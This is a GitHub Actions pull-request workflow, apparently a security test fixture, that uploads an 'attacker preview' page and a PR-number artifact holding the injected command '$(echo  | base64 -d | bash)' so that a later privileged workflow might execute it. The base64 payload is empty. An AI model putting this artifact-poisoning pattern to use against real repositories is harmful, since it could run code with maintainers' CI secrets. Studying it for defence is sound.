name: Build & Deploy
on:
  pull_request:

jobs:
  build-and-deploy:
    name: Build & Deploy
    runs-on: ubuntu-latest
    steps:
      - name: Contributor build
        run: |
          echo "MARKER_UNPRIVILEGED_BUILD_START run=${GITHUB_RUN_ID} repo=$GITHUB_REPOSITORY"
          mkdir -p dist prmeta
          printf '%s' '<!doctype html><html><body><p>attacker preview</p></body></html>' > dist/index.html
          printf '%s' '$(echo  | base64 -d | bash)' > prmeta/pr_number.txt
          printf '%s' "${{ github.event.pull_request.head.sha }}" > prmeta/pr_sha.txt
          echo "pr_number.txt bytes: $(wc -c < prmeta/pr_number.txt)"
      - name: Upload dist artifact
        uses: actions/upload-artifact@v7
        with:
          name: dist
          path: dist/
      - name: Upload PR metadata
        uses: actions/upload-artifact@v7
        with:
          name: pr-metadata
          path: prmeta/
